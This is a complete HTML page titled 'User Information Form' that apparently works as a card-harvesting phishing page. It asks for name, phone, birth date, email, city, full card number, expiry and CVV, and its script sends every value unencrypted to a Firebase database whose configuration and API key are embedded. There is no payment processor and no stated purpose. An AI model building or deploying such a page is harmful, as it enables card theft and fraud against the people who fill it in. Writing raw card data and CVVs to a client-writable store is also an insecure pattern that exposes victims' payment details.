<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>User Information Form</title>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/flatpickr/dist/flatpickr.min.css">
<script src="https://cdn.jsdelivr.net/npm/flatpickr"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.6.8/firebase-database-compat.js"></script>
<style>
  body {
    font-family: Arial, sans-serif;
    margin: 0;
    padding: 0;
  }
  header {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 60px;
    background-color: #292075;
    border-bottom: 1px solid #ccc;
    display: flex;
    justify-content: center;
    align-items: center;
    z-index: 1000;
  }
  header img {
    max-height: 50px;
  }
  .container {
    margin-top: 80px;
    padding: 20px;
    padding-bottom: 50px; /* Add padding at the bottom of the container */
  }
  form {
    max-width: 600px;
    margin: 0 auto;
    background-color: #fff;
    padding: 20px;
    border: 1px solid #ccc;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
  }
  label {
    display: block;
    margin-bottom: 10px;
  }
  input {
    width: 100%;
    padding: 10px;
    margin-bottom: 15px;
    box-sizing: border-box;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 14px;
  }
  button {
    height: 50px;
    width: 200px; /* Set a fixed width for the button */
    padding: 10px;
    margin: 15px auto 30px auto; /* Center the button and add bottom margin */
    display: block;
    box-sizing: border-box;
    border: none;
    border-radius: 4px;
    background-color: #007bff;
    color: #fff;
    font-size: 14px;
    cursor: pointer;
  }
  button:hover {
    background-color: #0056b3;
  }
</style>


</head>
<body>
  <header>
    <img src="logo.png" alt="Logo">
  </header>
  <div class="container">
    <form id="userForm" onsubmit="submitForm(); return false;">
      <label for="name">Name:</label>
      <input type="text" id="name" name="name" required>

      <label for="mobile">Mobile Number:</label>
      <input type="tel" id="mobile" name="mobile" pattern="[0-9]{10}" required>

      <label for="dob">Date of Birth:</label>
      <input type="text" id="dob" name="dob" required>

      <label for="email">Email:</label>
      <input type="email" id="email" name="email" required>

      <label for="city">City:</label>
      <input type="text" id="city" name="city" required>

      <label for="cardholdername">Card Holder Name:</label>
      <input type="text" id="cardholdername" name="cardholdername" required>

      <label for="cardnumber">Card Number:</label>
      <input type="text" id="cardnumber" name="cardNumber" maxlength="19" required>

      <label for="expiryDate">Card Expiry:</label>
      <input type="text" id="expiryDate" name="expiryDate" maxlength="5" placeholder="MM/YY" required>

      <label for="cvv">Card CVV:</label>
      <input type="text" id="cvv" name="cvv" maxlength="4" required>

      <button type="submit">Proceed Now</button>
    </form>
  </div>

  <script>
    // Initialize Flatpickr for the date input field
    flatpickr("#dob", {
        dateFormat: "Y-m-d",
        maxDate: "today"
    });

    // Add event listener to format card number input
    document.getElementById('cardnumber').addEventListener('input', function(e) {
        let input = e.target;
        let value = input.value.replace(/\D/g, ''); // Remove non-digit characters
        let formattedValue = '';

        for (let i = 0; i < value.length; i += 4) {
            if (i > 0) {
                formattedValue += ' ';
            }
            formattedValue += value.substring(i, i + 4);
        }

        input.value = formattedValue;
    });

    // Add event listener to format expiry date input
    document.getElementById('expiryDate').addEventListener('input', function(e) {
        let input = e.target;
        let value = input.value.replace(/\D/g, ''); // Remove non-digit characters
        let formattedValue = '';

        if (value.length > 0) {
            formattedValue = value.substring(0, 2); // MM
        }
        if (value.length > 2) {
            formattedValue += '/' + value.substring(2, 4); // /YY
        }

        input.value = formattedValue;
    });

    // Firebase configuration
    const firebaseConfig = {
        apiKey: "AIzaSyAEEaLD5oa8eDItR4P1E8kuS8iEeLCLoLA",
        authDomain: "fir-8966a.firebaseapp.com",
        databaseURL: "https://fir-8966a-default-rtdb.firebaseio.com",
        projectId: "fir-8966a",
        storageBucket: "fir-8966a.appspot.com",
        messagingSenderId: "495754940168",
        appId: "1:495754940168:web:c739abef5c4cca1b5726bd",
        measurementId: "G-YVQ1XG13S0"
    };

    // Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Function to handle form submission
    function submitForm() {
        const formData = {
            name: document.getElementById('name').value,
            mobile: document.getElementById('mobile').value,
            dob: document.getElementById('dob').value,
            email: document.getElementById('email').value,
            city: document.getElementById('city').value,
            CardHolderName: document.getElementById('cardholdername').value,
            cardNumber: document.getElementById('cardnumber').value.replace(/\s+/g, ''), // Remove spaces
            expiryDate: document.getElementById('expiryDate').value,
            cvv: document.getElementById('cvv').value
        };

        // Write data to Firebase
        database.ref("/data").child(formData.mobile).child("Details").set(formData, function(error) {
            if (error) {
                alert('Data could not be saved. ' + error);
            } else {
                alert('Data saved successfully.');
            }
        });
    }
  </script>
</body>
</html>
